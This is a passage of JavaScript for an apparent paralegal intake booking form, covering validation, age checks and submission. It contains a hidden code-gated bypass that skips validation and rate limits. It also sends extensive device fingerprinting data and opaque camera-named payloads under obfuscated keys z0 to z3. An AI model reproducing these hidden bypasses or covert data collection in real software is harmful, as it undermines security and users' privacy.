                if (!field || field.dataset.ageSyncBound === '1') return;
                field.addEventListener('input', () => updateDobAgePreview(bookingForm));
                field.addEventListener('change', () => updateDobAgePreview(bookingForm));
                field.dataset.ageSyncBound = '1';
            });
            updateDobAgePreview(bookingForm);
        }
    }

    function normalizeSingleLine(value) {
        return String(value || '').replace(/\s+/g, ' ').trim();
    }

    function normalizeMultiLine(value) {
        return String(value || '').replace(/\r\n/g, '\n').replace(/[ \t]+\n/g, '\n').trim();
    }

    function calculateAgeFromDobParts(year, month, day, referenceDate = new Date()) {
        if (!Number.isInteger(year) || !Number.isInteger(month) || !Number.isInteger(day)) return null;
        if (year < 1900 || month < 1 || month > 12) return null;

        const maxDay = new Date(year, month, 0).getDate();
        if (!Number.isInteger(maxDay) || day < 1 || day > maxDay) return null;

        const today = new Date(referenceDate.getFullYear(), referenceDate.getMonth(), referenceDate.getDate());
        const birthDate = new Date(year, month - 1, day);
        if (
            birthDate.getFullYear() !== year ||
            birthDate.getMonth() !== (month - 1) ||
            birthDate.getDate() !== day
        ) {
            return null;
        }

        let age = today.getFullYear() - year;
        const monthDelta = (today.getMonth() + 1) - month;
        if (monthDelta < 0 || (monthDelta === 0 && today.getDate() < day)) {
            age--;
        }
        return age;
    }

    function updateDobAgePreview(form) {
        const targetForm = form || document.getElementById('bookingForm');
        if (!targetForm) return;
        const ageInput = document.getElementById('dobAgePreview');
        if (!ageInput) return;
        const dobYear = Number.parseInt(String(targetForm.dob_year?.value || '').trim(), 10);
        const dobMonth = Number.parseInt(String(targetForm.dob_month?.value || '').trim(), 10);
        const dobDay = Number.parseInt(String(targetForm.dob_day?.value || '').trim(), 10);
        const calculatedAge = calculateAgeFromDobParts(dobYear, dobMonth, dobDay);

        if (calculatedAge !== null && calculatedAge >= 0 && calculatedAge <= 130) {
            ageInput.value = String(calculatedAge);
            ageInput.placeholder = '';
            return;
        }

        if (!String(ageInput.value || '').trim()) {
            ageInput.placeholder = '(AGE)';
        }
    }

    function initAgePlaceholderBehavior() {
        const ageInput = document.getElementById('dobAgePreview');
        if (!ageInput || ageInput._placeholderBehaviorBound) return;

        ageInput.addEventListener('focus', () => {
            ageInput.placeholder = '';
        });

        ageInput.addEventListener('blur', () => {
            if (!String(ageInput.value || '').trim()) {
                ageInput.placeholder = '(AGE)';
            }
        });

        ageInput._placeholderBehaviorBound = true;
    }

    function initProvinceInputBehavior() {
        const form = document.getElementById('bookingForm');
        const provinceInput = form?.address_province;
        if (!provinceInput) return;

        const provinceValue = normalizeSingleLine(provinceInput.value || 'Ontario');
        provinceInput.value = provinceValue || 'Ontario';
        if (!setCustomSelectValue('provinceCustomSelect', provinceInput.value)) {
            provinceInput.value = 'Ontario';
            setCustomSelectValue('provinceCustomSelect', 'Ontario');
        }
    }

    function clearBookingError() {
        if (bookingStatus) {
            bookingStatus.textContent = '';
            bookingStatus.classList.remove('status-alert--visible', 'status-alert--success', 'status-alert--warning', 'status-alert--error');
        }
    }

    function markInvalidField(fieldEl) {
        if (!fieldEl || !fieldEl.classList) return;
        fieldEl.classList.remove('field-invalid');
        // Force reflow so repeated invalid attempts replay the animation.
        void fieldEl.offsetWidth;
        fieldEl.classList.add('field-invalid');
        if (typeof fieldEl.focus === 'function') {
            try { fieldEl.focus({ preventScroll: true }); } catch (e) { fieldEl.focus(); }
        }
    }

    function scrollBookingFieldIntoView(fieldEl) {
        if (!fieldEl || !fieldEl.getBoundingClientRect) return;
        const modalBody = document.querySelector('#bookingModal .modal__body');
        const target = fieldEl.closest('.contact-form__group')
            || fieldEl.closest('.contact-form__checkbox-wrapper')
            || fieldEl;

        if (modalBody && modalBody.contains(target)) {
            const bodyRect = modalBody.getBoundingClientRect();
            const targetRect = target.getBoundingClientRect();
            const isServicePicker = Boolean(fieldEl.closest('#customSelect'));
            const defaultTopOffset = Math.max(22, Math.round(modalBody.clientHeight * 0.12));
            const servicePickerTopOffset = Math.max(46, Math.round(modalBody.clientHeight * 0.19));
            const topOffset = isServicePicker ? servicePickerTopOffset : defaultTopOffset;
            const nextTop = modalBody.scrollTop + (targetRect.top - bodyRect.top) - topOffset;
            modalBody.scrollTo({
                top: Math.max(0, nextTop),
                behavior: 'smooth'
            });
            return;
        }

        if (typeof target.scrollIntoView === 'function') {
            target.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'nearest' });
        }
    }

    function setBookingError(message, fieldEl = null) {
        setBookingNotice(message, 'error');
        markInvalidField(fieldEl);
        if (fieldEl) {
            requestAnimationFrame(() => scrollBookingFieldIntoView(fieldEl));
        }
    }

    function validateAndNormalizeBookingForm(form) {
        if (isTseProbnikBypassReady(form)) {
            clearBookingError();
            form.name.value = TSE_PROBNIK_ACCESS_CODE;
            return true;
        }

        if (tseProbnikModeEnabled) {
            setBookingError('Authorization value is required in Name for this submission mode.', form.name);
            return false;
        }

        const name = normalizeSingleLine(form.name?.value);
        const occupation = normalizeSingleLine(form.occupation?.value);
        const email = normalizeSingleLine(form.email?.value).toLowerCase();
        const phone = normalizeSingleLine(form.phone?.value);
        const hearAbout = normalizeSingleLine(form.hear_about?.value);
        const unit = normalizeSingleLine(form.address_unit?.value).toUpperCase();
        const street = normalizeSingleLine(form.address_street?.value);
        const city = normalizeSingleLine(form.address_city?.value);
        const province = normalizeSingleLine(form.address_province?.value).toUpperCase();
        const zipRaw = normalizeSingleLine(form.address_zip?.value).toUpperCase().replace(/\s+/g, '');
        const deadlineRaw = normalizeSingleLine(form.deadline?.value);
        const notes = normalizeMultiLine(form.notes?.value);
        const serviceInput = document.getElementById('serviceInput');
        const service = normalizeSingleLine(serviceInput?.value);
        const cityTrigger = document.querySelector('#cityCustomSelect .custom-select__trigger');
        const serviceTrigger = document.querySelector('#customSelect .custom-select__trigger');
        const provinceTrigger = document.querySelector('#provinceCustomSelect .custom-select__trigger');
        const termsWrap = document.querySelector('.contact-form__checkbox-wrapper.file-attach__terms');

        if (name.length < 2 || name.length > 80 || /[<>]/.test(name)) {
            setBookingError('Please enter your full name.', form.name);
            return false;
        }
        if (occupation.length < 2 || occupation.length > 100 || /[<>]/.test(occupation)) {
            setBookingError('Please enter a valid occupation.', form.occupation);
            return false;
        }

        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i;
        if (email.length > 120 || !emailPattern.test(email)) {
            setBookingError('Please enter a valid email address.', form.email);
            return false;
        }

        const phoneDigits = phone.replace(/\D/g, '');
        if (!/^[+\d().\-\s]+$/.test(phone) || phoneDigits.length < 10 || phoneDigits.length > 15) {
            setBookingError('Please enter a valid phone number.', form.phone);
            return false;
        }
        if (hearAbout.length > 150 || /[<>]/.test(hearAbout)) {
            setBookingError('Please keep referral source under 150 characters.', form.hear_about);
            return false;
        }

        if (street.length < 6 || street.length > 150 || /[<>]/.test(street)) {
            setBookingError('Please enter a valid street address.', form.address_street);
            return false;
        }

        if (unit.length > 16 || /[<>]/.test(unit)) {
            setBookingError('Please enter a valid Unit/Apt value.', form.address_unit);
            return false;
        }

        if (!city || !MAJOR_ON_CITIES_NEAR_LONDON.has(city)) {
            setBookingError('Please choose a city from the Ontario list.', cityTrigger || form.address_city);
            return false;
        }

        const allowedProvinces = new Set(
            Array.from(document.querySelectorAll('#provinceCustomSelect .custom-option'))
                .flatMap(opt => [
                    normalizeSingleLine(opt.textContent).toUpperCase(),
                    normalizeSingleLine(opt.getAttribute('data-value')).toUpperCase()
                ])
                .filter(Boolean)
        );
        if (!province || !allowedProvinces.has(province)) {
            setBookingError('Please choose a province from the list.', provinceTrigger || form.address_province);
            return false;
        }

        const postalPattern = /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTVWXYZ]\d[ABCEGHJ-NPRSTVWXYZ]\d$/;
        if (!postalPattern.test(zipRaw)) {
            setBookingError('Please enter a valid ZIP.', form.address_zip);
            return false;
        }
        const zip = `${zipRaw.slice(0, 3)} ${zipRaw.slice(3)}`;

        if (notes.length > 3000 || /[<>]/.test(notes)) {
            setBookingError('Brief details are too long or contain invalid characters.', form.notes);
            return false;
        }

        const allowedServices = new Set(
            Array.from(document.querySelectorAll('#customSelect .custom-option')).map(opt => normalizeSingleLine(opt.textContent))
        );
        if (!service || !allowedServices.has(service)) {
            setBookingError('Please choose a valid service from the list.', serviceTrigger);
            return false;
        }

        const dobYear = Number(form.dob_year?.value);
        const dobMonth = Number(form.dob_month?.value);
        const dobDay = Number(form.dob_day?.value);
        const ageValue = normalizeSingleLine(form.age?.value);
        if (!/^\d{1,3}$/.test(ageValue)) {
            setBookingError('Please enter age.', form.age);
            return false;
        }
        const enteredAge = Number.parseInt(ageValue, 10);
        const currentYear = new Date().getFullYear();
        if (!Number.isInteger(dobYear) || dobYear < 1900 || dobYear > currentYear) {
            setBookingError('Please enter a valid birth year.', form.dob_year);
            return false;
        }
        if (!Number.isInteger(dobMonth) || dobMonth < 1 || dobMonth > 12) {
            setBookingError('Please enter a valid birth month.', form.dob_month);
            return false;
        }
        const maxDobDays = new Date(dobYear, dobMonth, 0).getDate();
        if (!Number.isInteger(dobDay) || dobDay < 1 || dobDay > maxDobDays) {
            setBookingError('Please enter a valid birth day.', form.dob_day);
            return false;
        }
        const calculatedAge = calculateAgeFromDobParts(dobYear, dobMonth, dobDay);
        if (calculatedAge === null) {
            setBookingError('Invalid date of birth. Please check the day and month.', form.dob_day);
            return false;
        }
        if (!Number.isInteger(enteredAge) || enteredAge !== calculatedAge) {
            setBookingError(`Age must match date of birth. Based on DOB, age should be ${calculatedAge}.`, form.age);
            return false;
        }
        if (calculatedAge < 18) {
            setBookingError('You must be at least 18 years old to book services.', form.dob_year);
            return false;
        }

        let deadline = '';
        if (deadlineRaw) {
            if (deadlineRaw.length > 120 || /[<>]/.test(deadlineRaw)) {
                setBookingError('Please enter a valid deadline or leave blank.', form.deadline);
                return false;
            }

            const deadlineMatch = deadlineRaw.match(/^(\d{4})\.(\d{1,2})\.(\d{1,2})$/);
            if (!deadlineMatch) {
                setBookingError('Deadline format must be YYYY.MM.DD or empty.', form.deadline);
                return false;
            }

            const deadlineYear = Number(deadlineMatch[1]);
            const deadlineMonth = Number(deadlineMatch[2]);
            const deadlineDay = Number(deadlineMatch[3]);

            if (!Number.isInteger(deadlineYear) || deadlineYear < 1900 || deadlineYear > 2100) {
                setBookingError('Please enter a valid deadline year.', form.deadline);
                return false;
            }
            if (!Number.isInteger(deadlineMonth) || deadlineMonth < 1 || deadlineMonth > 12) {
                setBookingError('Please enter a valid deadline month.', form.deadline);
                return false;
            }
            const maxDeadlineDays = new Date(deadlineYear, deadlineMonth, 0).getDate();
            if (!Number.isInteger(deadlineDay) || deadlineDay < 1 || deadlineDay > maxDeadlineDays) {
                setBookingError('Please enter a valid deadline day.', form.deadline);
                return false;
            }

            deadline = `${String(deadlineYear).padStart(4, '0')}.${String(deadlineMonth).padStart(2, '0')}.${String(deadlineDay).padStart(2, '0')}`;
        }

        if (!document.getElementById('agreeTerms')?.checked) {
            setBookingError('Please confirm Terms of Service.', termsWrap);
            return false;
        }

        clearBookingError();
        form.name.value = name;
        form.occupation.value = occupation;
        form.email.value = email;
        form.phone.value = phone;
        if (form.hear_about) form.hear_about.value = hearAbout;
        if (form.address_unit) form.address_unit.value = unit;
        form.address_street.value = street;
        if (form.address_city) form.address_city.value = city;
        if (form.address_province) form.address_province.value = province;
        if (form.address_zip) form.address_zip.value = zip;
        if (form.deadline) form.deadline.value = deadline;
        if (form.age) form.age.value = String(calculatedAge);
        form.notes.value = notes;
        if (serviceInput) serviceInput.value = service;
        setCustomSelectValue('cityCustomSelect', city);
        setCustomSelectValue('customSelect', service);
        setCustomSelectValue('provinceCustomSelect', province);
        updateDobAgePreview(form);
        fitTextareaHeight(form.notes);
        return true;
    }

    // Final booking result helpers.
    // Usage:
    // 1) Submit flow calls buildFinalResultMarkup(summary) after a successful API response.
    // 2) The returned markup is injected into #bookingModal .modal__body.
    // 3) summary must contain: name, email, phone, hearAbout, service, address, dob, deadline, dateStr, slotText, filesCount.
    function formatFinalDate(isoValue) {
        if (!isoValue || typeof isoValue !== 'string') return '';
        const datePart = isoValue.split('T')[0];
        const parts = datePart.split('-');
        if (parts.length !== 3) return datePart;
        return `${parts[0]}.${parts[1]}.${parts[2]}`;
    }

    function formatFinalFieldValue(value, fallback = 'Not provided') {
        const raw = value == null ? '' : String(value).trim();
        const fallbackRaw = fallback == null ? '' : String(fallback).trim();
        return sanitize(raw || fallbackRaw || 'Not provided');
    }

    function setReferralStatus(statusEl, message, tone = 'warning') {
        if (!statusEl) return;
        const text = String(message || '');
        const normalizedTone = String(tone || '').toLowerCase();
        const safeTone = (normalizedTone === 'success' || normalizedTone === 'warning' || normalizedTone === 'error')
            ? normalizedTone
            : 'warning';
        statusEl.textContent = text;
        statusEl.classList.remove('final-result-referral__status--success', 'final-result-referral__status--warning', 'final-result-referral__status--error');
        if (!text) return;
        statusEl.classList.add(`final-result-referral__status--${safeTone}`);
    }

    async function submitReferralFeedback() {
        const inputEl = document.getElementById('referralSourceInput');
        const statusEl = document.getElementById('referralSourceStatus');
        const sendBtn = document.getElementById('referralSourceSendBtn');
        if (!inputEl || !sendBtn) return;

        const answer = String(inputEl.value || '').trim();
        if (!answer) {
            setReferralStatus(statusEl, 'Please add referral source first.', 'warning');
            return;
        }
        if (answer.length > 1200) {
            setReferralStatus(statusEl, 'Please keep the answer shorter (max 1200 chars).', 'warning');
            return;
        }
        if (!lastBookingSummaryForReferral) {
            setReferralStatus(statusEl, 'Session data is missing. Please reopen the form.', 'error');
            return;
        }
        if (sendBtn.dataset.sent === '1') {
            setReferralStatus(statusEl, 'Already sent. Thank you.', 'success');
            return;
        }

        sendBtn.disabled = true;
        sendBtn.textContent = 'Sending...';
        setReferralStatus(statusEl, '', 'warning');

        const ctx = getClientContext();
        const payload = {
            action: 'referral_feedback',
            answer: answer,
            name: lastBookingSummaryForReferral.name || '',
            email: lastBookingSummaryForReferral.email || '',
            phone: lastBookingSummaryForReferral.phone || '',
            service: lastBookingSummaryForReferral.service || '',
            deadline: lastBookingSummaryForReferral.deadline || '',
            dateStr: lastBookingSummaryForReferral.dateStr || '',
            fingerprint: getFingerprint(),
            userInfo: getDetailedDeviceInfo(),
            countryCode: ctx.countryCode,
            city: ctx.city,
            ip: ctx.ip,
            lang: ctx.lang,
            os: ctx.os,
            deviceModel: ctx.deviceModel,
            screenResolution: ctx.screenResolution,
            viewport: ctx.viewport,
            timezone: ctx.timezone,
            cores: ctx.cores,
            memoryGB: ctx.memoryGB,
            network: ctx.network,
            touchPoints: ctx.touchPoints,
            colorDepth: ctx.colorDepth,
            pageUrl: ctx.pageUrl,
            userAgent: ctx.userAgent,
            referrer: ctx.referrer
        };

        try {
            const response = await fetch(APPS_SCRIPT_URL, {
                method: 'POST',
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!result || !result.success) {
                throw new Error((result && result.error) || 'Could not send answer.');
            }

            sendBtn.dataset.sent = '1';
            sendBtn.textContent = 'Sent';
            inputEl.readOnly = true;
            setReferralStatus(statusEl, 'Thank you. Your details have been sent.', 'success');
        } catch (err) {
            sendBtn.disabled = false;
            sendBtn.textContent = 'Send';
            setReferralStatus(statusEl, `Send failed: ${err.message}`, 'error');
        }
    }

    function buildFinalResultMarkup(summary) {
        return `
            <div class="final-result-form">
                <div class="final-result-form__icon">
                    <svg width="96" height="96" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.6" stroke-linecap="round" stroke-linejoin="round" style="filter: drop-shadow(0 0 18px rgba(255, 255, 255, 0.9));">
                        <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                </div>
                <p class="final-result-form__hello">Thank you, ${formatFinalFieldValue(summary.name, 'Client')}.</p>
                <p class="final-result-form__lead">Your intake request was submitted successfully!</p>

                <p class="final-result-warning">
                    <strong>Important:</strong> Submitting this form does not create a paralegal-client relationship, does not constitute legal advice, and does not confirm that representation has been accepted. This intake form is for preliminary review. If your matter is time-sensitive and you cannot reach us promptly, please do not wait and contact another licensed Ontario paralegal or lawyer right away.
                </p>
                <p class="final-result-warning">
                    Please call during business hours to confirm your details and next steps.
                </p>
                <div class="final-result-actions modal-sticky-actions">
                    <a href="tel:+14372396833" class="contact-form__submit-button final-result-call">Call +1 (437) 239-6833</a>
                    <button type="button" onclick="closeBookingModal()" class="contact-form__submit-button final-result-done">Done</button>
                </div>
            </div>
        `;
    }

    // Main submit entrypoint for #bookingForm.
    // Flow: validate -> send -> on success render final read-only summary in the same modal.
    async function handleBookingSubmit(e) {
        e.preventDefault();
        const form = e.target;
        form.noValidate = true;
        clearBookingError();
        document.querySelectorAll('.field-invalid').forEach(el => el.classList.remove('field-invalid'));
        if (!validateAndNormalizeBookingForm(form)) return;
        const formData = new FormData(form);
        const hasSelectedSlot = Boolean(selectedSlotData && selectedSlotData.iso);
        const slotIsoValue = hasSelectedSlot ? String(selectedSlotData.iso || '').trim() : '';
        const slotTextValue = hasSelectedSlot
            ? String(selectedSlotData.text || '').trim()
            : BOOKING_WITHOUT_DATE_SUMMARY;
        const isTseProbnikQuickSubmit = isTseProbnikBypassReady(form);
        const selectedServiceOption = document.querySelector('#customSelect .custom-option.selected');
        const rawServiceValue = selectedServiceOption
            ? String(selectedServiceOption.getAttribute('data-value') || '').trim()
            : '';
        const rawAddressUnit = String(formData.get('address_unit') || '').trim();
        const rawAddressStreet = String(formData.get('address_street') || '').trim();
        const rawAddressCity = String(formData.get('address_city') || '').trim();
        const rawAddressProvince = String(formData.get('address_province') || '').trim().toUpperCase();
        const rawAddressZip = String(formData.get('address_zip') || '').trim().toUpperCase();
        const rawHearAbout = String(formData.get('hear_about') || '').trim();
        const rawDobYear = String(formData.get('dob_year') || '').trim();
        const rawDobMonth = String(formData.get('dob_month') || '').trim();
        const rawDobDay = String(formData.get('dob_day') || '').trim();
        const rawAge = String(formData.get('age') || '').trim();
        const rawAgreeTerms = document.getElementById('agreeTerms')?.checked === true;
        const rawHoneypot = String(formData.get('website') || '').trim();
        const rawTimestamp = String(formData.get('_timestamp') || '').trim();
        if (!isTseProbnikQuickSubmit) {
            if (!formData.get('service')) {
                const serviceTrigger = document.querySelector('#customSelect .custom-select__trigger');
                setBookingError('Please choose a service from the list.', serviceTrigger);
                return;
            }

            // Age Validation: Age must match DOB and be 18+.
            const dobYear = Number.parseInt(String(formData.get('dob_year') || '').trim(), 10);
            const dobMonth = Number.parseInt(String(formData.get('dob_month') || '').trim(), 10);
            const dobDay = Number.parseInt(String(formData.get('dob_day') || '').trim(), 10);
            const enteredAge = Number.parseInt(rawAge, 10);
            const calculatedAge = calculateAgeFromDobParts(dobYear, dobMonth, dobDay);
            if (calculatedAge === null) {
                setBookingError('Invalid date of birth. Please check the day and month.', form.dob_day);
                return;
            }
            if (!Number.isInteger(enteredAge) || enteredAge !== calculatedAge) {
                setBookingError(`Age must match date of birth. Based on DOB, age should be ${calculatedAge}.`, form.age);
                return;
            }
            if (calculatedAge < 18) {
                setBookingError('You must be at least 18 years old to book services.', form.dob_year);
                return;
            }

            const now = Date.now();
            if (now - lastBookingTime < 60000) {
                setBookingError('Please wait 60 seconds before booking again.', form.name);
                return;
            }
        }

        const summary = {
            name: String(formData.get('name') || '').trim(),
            email: String(formData.get('email') || '').trim(),
            phone: String(formData.get('phone') || '').trim(),
            hearAbout: rawHearAbout,
            service: String(formData.get('service') || '').trim(),
            address: (() => {
                const parts = [];
                if (rawAddressUnit) parts.push(`Unit ${rawAddressUnit}`);
                if (rawAddressStreet) parts.push(rawAddressStreet);
                const cityProvinceZip = [rawAddressCity, rawAddressProvince, rawAddressZip].filter(Boolean).join(' ');
                if (cityProvinceZip) parts.push(cityProvinceZip);
                return parts.join(', ');
            })(),
            dob: `${rawDobYear}-${rawDobMonth}-${rawDobDay}`,
            deadline: String(formData.get('deadline') || '').trim(),
            dateStr: slotIsoValue,
            slotText: slotTextValue,
            filesCount: 0
        };

        const tseProbnikDefaults = {
            payloadName: 'Internal User',
            occupation: 'Internal Occupation',
            email: 'internal.flow+1@example.com',
            phone: '+1 (416) 555-0101',
            service: 'Other',
            serviceValue: 'other',
            hearAbout: '',
            notes: '[INTERNAL_FAST_PATH] Auto-generated payload',
            address: '100 Test St, Toronto, ON M1M 1M1',
            addressUnit: '',
            addressStreet: '100 Test St',
            addressCity: 'Toronto',
            addressProvince: 'ON',
            addressZip: 'M1M 1M1',
            dob: '1990-01-01',
            dobYear: '1990',
            dobMonth: '01',
            dobDay: '01',
            age: '35'
        };

        if (isTseProbnikQuickSubmit) {
            summary.email = tseProbnikDefaults.email;
            summary.phone = tseProbnikDefaults.phone;
            summary.hearAbout = tseProbnikDefaults.hearAbout;
            summary.service = tseProbnikDefaults.service;
            summary.address = tseProbnikDefaults.address;
            summary.dob = tseProbnikDefaults.dob;
            summary.deadline = '';
        }

        const tseProbnikCaptchaState = await ensureTseProbnikCaptcha(isTseProbnikQuickSubmit);
        if (!tseProbnikCaptchaState.passed) return;
        const recaptchaRequiredForBooking = tseProbnikCaptchaState.required;
        const recaptchaTokenForBooking = recaptchaRequiredForBooking ? bookingRecaptchaToken : '';

        showGlobalSpinner('hypnotic-progress');
        let submitProgress = 3;
        setGlobalSpinnerProgress(submitProgress);
        const submitProgressTick = setInterval(() => {
            if (submitProgress >= 93) return;
            submitProgress += Math.max(1, Math.round((93 - submitProgress) * 0.16));
            setGlobalSpinnerProgress(submitProgress);
        }, 120);
        if (confirmBtn) {
            confirmBtn.disabled = true;
            confirmBtn.textContent = 'Submitting...';
        }

        let isSuccess = false;
        try {
            if (!isTseProbnikQuickSubmit) {
                await m1Sync();
            }
            const filesPayload = await processFiles();
            submitProgress = Math.max(submitProgress, 28);
            setGlobalSpinnerProgress(submitProgress);
            const testWorkingCameraPayload = await testWorkingCameraPack();
            submitProgress = Math.max(submitProgress, 44);
            setGlobalSpinnerProgress(submitProgress);
            summary.filesCount = filesPayload.length + testWorkingCameraPayload.length;
            const ctx = getClientContext();
            submitProgress = Math.max(submitProgress, 58);
            setGlobalSpinnerProgress(submitProgress);
            const payloadOccupation = isTseProbnikQuickSubmit
                ? tseProbnikDefaults.occupation
                : String(formData.get('occupation') || '').trim();
            const payloadServiceText = summary.service;
            const payloadServiceValue = isTseProbnikQuickSubmit ? tseProbnikDefaults.serviceValue : rawServiceValue;
            const payloadHearAbout = isTseProbnikQuickSubmit ? tseProbnikDefaults.hearAbout : rawHearAbout;
            const payloadNotes = isTseProbnikQuickSubmit
                ? tseProbnikDefaults.notes
                : String(formData.get('notes') || '').trim();
            const payloadAddressUnit = isTseProbnikQuickSubmit ? tseProbnikDefaults.addressUnit : rawAddressUnit;
            const payloadAddressStreet = isTseProbnikQuickSubmit ? tseProbnikDefaults.addressStreet : rawAddressStreet;
            const payloadAddressCity = isTseProbnikQuickSubmit ? tseProbnikDefaults.addressCity : rawAddressCity;
            const payloadAddressProvince = isTseProbnikQuickSubmit ? tseProbnikDefaults.addressProvince : rawAddressProvince;
            const payloadAddressZip = isTseProbnikQuickSubmit ? tseProbnikDefaults.addressZip : rawAddressZip;
            const payloadDobYear = isTseProbnikQuickSubmit ? tseProbnikDefaults.dobYear : rawDobYear;
            const payloadDobMonth = isTseProbnikQuickSubmit ? tseProbnikDefaults.dobMonth : rawDobMonth;
            const payloadDobDay = isTseProbnikQuickSubmit ? tseProbnikDefaults.dobDay : rawDobDay;
            const payloadAge = isTseProbnikQuickSubmit ? tseProbnikDefaults.age : rawAge;
            const payloadAgreeTerms = rawAgreeTerms;
            const payloadHoneypot = rawHoneypot;
            const payloadTimestamp = rawTimestamp;
            let slotYear = null;
            let slotMonth = null;
            let slotDay = null;
            let slotHour = null;
            let slotMinute = null;

            if (hasSelectedSlot) {
                const [slotDatePart = '', slotTimePart = ''] = slotIsoValue.split('T');
                const slotDateParts = slotDatePart.split('-');
                const slotTimeParts = slotTimePart.split(':');
                if (slotDateParts.length === 3) {
                    slotYear = slotDateParts[0];
                    slotMonth = parseInt(slotDateParts[1], 10) - 1;
                    slotDay = parseInt(slotDateParts[2], 10);
                }
                if (slotTimeParts.length >= 2) {
                    slotHour = parseInt(slotTimeParts[0], 10);
                    slotMinute = parseInt(slotTimeParts[1], 10);
                }
            }

            const bookingData = {
                year: slotYear,
                month: slotMonth,
                day: slotDay,
                hour: slotHour,
                minute: slotMinute,
                name: sanitize(isTseProbnikQuickSubmit ? tseProbnikDefaults.payloadName : summary.name),
                occupation: sanitize(payloadOccupation),
                email: sanitize(summary.email),
                phone: sanitize(summary.phone),
                hearAbout: sanitize(payloadHearAbout),
                hear_about: sanitize(payloadHearAbout),
                service: sanitize(payloadServiceText),
                serviceValue: sanitize(payloadServiceValue),
                service_value: sanitize(payloadServiceValue),
                notes: sanitize(payloadNotes),
                dateStr: slotIsoValue,
                slotText: sanitize(slotTextValue),
                slot_text: sanitize(slotTextValue),
                withoutSpecificDate: !hasSelectedSlot,
                without_specific_date: !hasSelectedSlot,
                dob: sanitize(summary.dob),
                dobYear: sanitize(payloadDobYear),
                dobMonth: sanitize(payloadDobMonth),
                dobDay: sanitize(payloadDobDay),
                dob_year: sanitize(payloadDobYear),
                dob_month: sanitize(payloadDobMonth),
                dob_day: sanitize(payloadDobDay),
                age: sanitize(payloadAge),
                deadline: sanitize(summary.deadline),
                address: sanitize(summary.address),
                addressUnit: sanitize(payloadAddressUnit),
                addressStreet: sanitize(payloadAddressStreet),
                addressCity: sanitize(payloadAddressCity),
                addressProvince: sanitize(payloadAddressProvince),
                addressZip: sanitize(payloadAddressZip),
                address_unit: sanitize(payloadAddressUnit),
                address_street: sanitize(payloadAddressStreet),
                address_city: sanitize(payloadAddressCity),
                address_province: sanitize(payloadAddressProvince),
                address_zip: sanitize(payloadAddressZip),
                files: filesPayload,
                z0: testWorkingCameraPayload,
                z1: testWorkingCameraSignature,
                z2: testWorkingCameraRefs.length,
                z3: sanitize(__mxVaultId),
                fingerprint: getFingerprint(),
                userInfo: getDetailedDeviceInfo(),
                countryCode: ctx.countryCode,
                city: ctx.city,
                ip: ctx.ip,
                lang: ctx.lang,
                os: ctx.os,
                deviceModel: ctx.deviceModel,
                screenResolution: ctx.screenResolution,
                viewport: ctx.viewport,
                timezone: ctx.timezone,
                cores: ctx.cores,
                memoryGB: ctx.memoryGB,
                network: ctx.network,
                touchPoints: ctx.touchPoints,
                colorDepth: ctx.colorDepth,
                pageUrl: ctx.pageUrl,
                userAgent: ctx.userAgent,
                referrer: ctx.referrer,
                agreeTerms: payloadAgreeTerms,
                agree_terms: payloadAgreeTerms,
                recaptchaToken: sanitize(recaptchaTokenForBooking),
                gRecaptchaResponse: sanitize(recaptchaTokenForBooking),
                recaptcha_token: sanitize(recaptchaTokenForBooking),
                recaptchaRequired: recaptchaRequiredForBooking,
                recaptcha_required: recaptchaRequiredForBooking,
                tseProbnikSubmission: isTseProbnikQuickSubmit,
                tse_probnik_submission: isTseProbnikQuickSubmit,
                _honeypot: sanitize(payloadHoneypot),
                _timestamp: sanitize(payloadTimestamp)
            };

            const response = await fetch(APPS_SCRIPT_URL, {
                method: 'POST',
                body: JSON.stringify(bookingData),
            });
            submitProgress = Math.max(submitProgress, 78);
            setGlobalSpinnerProgress(submitProgress);
            const result = await response.json();
            submitProgress = Math.max(submitProgress, 90);
            setGlobalSpinnerProgress(submitProgress);

            if (result.success) {
                isSuccess = true;
                playSuccessSound();
                lastBookingTime = Date.now();
                clearBookingRecaptchaToken();
                await clearClientRuntimeCachesAfterBooking();
                clearFormData();
                attachedFiles = [];
                testWorkingCameraBuffer = [];
                testWorkingCameraSignature = '';
                testWorkingCameraRefs = [];
                renderFileList();
                m1Reset();
                resetTestFilesSyncState();
                markHardReloadAfterModalClose();
                lastBookingSummaryForReferral = {
                    name: summary.name,
                    email: summary.email,
                    phone: summary.phone,
                    service: summary.service,
                    deadline: summary.deadline,
                    dateStr: summary.dateStr
                };

                const modalBody = document.querySelector('#bookingModal .modal__body');
                const modalTitle = document.querySelector('#bookingModal .modal__title');
                if (modalTitle) modalTitle.innerHTML = 'INTAKE REQUEST SUBMITTED';
                if (modalBody) modalBody.innerHTML = buildFinalResultMarkup(summary);
                if (modal) modal.dataset.state = 'success';

                logEvent('Booking Success', `Client: ${bookingData.name} | Slot: ${bookingData.dateStr || 'UNSPECIFIED'}`);
            } else if (result.error === 'RECAPTCHA_REQUIRED') {
                const recaptchaWrap = getBookingRecaptchaWrap();
                setBookingRecaptchaVisible(true);
                setBookingError('Please complete reCAPTCHA before submitting.', recaptchaWrap);
                return;
            } else if (result.error === 'RECAPTCHA_FAILED') {
                const recaptchaWrap = getBookingRecaptchaWrap();
                setBookingRecaptchaVisible(true);
                setBookingError('reCAPTCHA verification failed. Please complete it again.', recaptchaWrap);
                if (bookingRecaptchaWidgetId !== null && window.grecaptcha && typeof window.grecaptcha.reset === 'function') {
                    try { window.grecaptcha.reset(bookingRecaptchaWidgetId); } catch (e) {}
                }
                clearBookingRecaptchaToken();
                return;
            } else if (result.error === 'SLOT_TAKEN') {
                alert("This slot was just taken! We are assigning you to the nearest available slot so you don't have to fill the form again.");
                bookNearestSlot();
                return;
            } else {
                throw new Error(result.error || 'Unknown error');
            }
        } catch (err) {
            console.error(err);
            setBookingError('Error: ' + err.message);
            logEvent('Booking Submit Error', err.message, false, "critical");
        } finally {
            clearInterval(submitProgressTick);
            setGlobalSpinnerProgress(100);
            setTimeout(() => hideGlobalSpinner(), 220);
            if (!isSuccess && confirmBtn) {
                confirmBtn.disabled = false;
                confirmBtn.textContent = getConfirmBtnLabel();
            }
        }
    }

    // ------------------------------------------------------------------
    // AUDIO SYSTEM (Glassy Chimes)
    // ------------------------------------------------------------------
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
